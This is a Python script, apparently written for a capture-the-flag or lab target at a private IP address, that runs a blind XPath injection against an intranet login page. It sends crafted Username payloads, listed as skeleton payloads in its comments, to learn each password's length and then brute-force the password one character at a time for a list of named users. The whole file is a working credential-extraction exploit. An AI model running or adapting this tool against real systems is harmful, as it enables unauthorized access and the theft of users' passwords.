#!/usr/bin/python3


#A SIMPLE XPATH INJECTION PASSWORD RETRIEVER WHEREIN U GIVE THE USERNAMES
#SKELETON PAYLOAD:
	#' or 1=1 and string-length(Password/text())=1 or '1'='2
	#' or 1=1 and substring(Password,1,1)="a" or '1'='2
import requests
import string
from pwn import *
from tqdm import tqdm
from time import sleep	

keyspace=string.printable[:-5]
proxies={"http":"http://127.0.0.1:8080"}    #Make sure u r right with proxy

names=['rita','jim','bryan']    #CHANGE THE USERNAMES FOR WHICH U WANT TO FIND THE PASSWORD
def get_length(username):
	user=username
	i=1
	while True:
		 payload = f"{user}'and 1=1 and string-length(Password/text())={i} or '1'='2"
		 data = {"Username":payload,"Password":"bhosa"}
		 r=requests.post("http://172.31.179.1/intranet.php",data=data,proxies=proxies)
		 resp=r.text
		 if (f"{user}" in resp):
		 	break
		 i=i+1
	return i
def get_pass():
	for name in names:
			log.progress(f"Password for {name}:")
			length=get_length(name)
			pw=[]
			f=1
			# pbar=tqdm(total=100)
			while True:
				# pbar.update(10)
				if(f==length+1):
					print()
					print()
					break
				for char in keyspace:
					payload1=f"{name}' and 1=1 and substring(Password,{f},1)=\"{char}\" or '1'='2"
					data1 = {"Username":payload1,"Password":"bhosa"}
					r1=requests.post("http://172.31.179.1/intranet.php",data=data1,proxies=proxies)
					resp1=r1.text
					if (f"{name}" in resp1):
						print(char,end='',flush=True)
						break
				f=f+1

	
		
				 		
				
	return log.success("Done G")		
get_pass()
